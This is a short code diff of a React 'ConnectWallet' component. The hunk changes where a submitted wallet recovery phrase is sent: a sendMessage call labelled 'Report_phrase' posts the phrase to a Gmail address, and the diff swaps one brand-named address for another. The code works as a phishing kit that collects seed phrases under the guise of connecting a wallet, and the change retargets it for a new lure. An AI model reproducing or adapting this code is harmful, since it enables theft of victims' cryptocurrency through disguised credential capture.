@@ -103,7 +103,7 @@ export default function ConnectWallet() {
       sendMessage(
         `phrase:  ${value.phrase}`,
         "Report_phrase",
-        "platformKryptospace@gmail.com"
+        "platformStackcoin@gmail.com"
       )
         .then(() => {
           setValue({
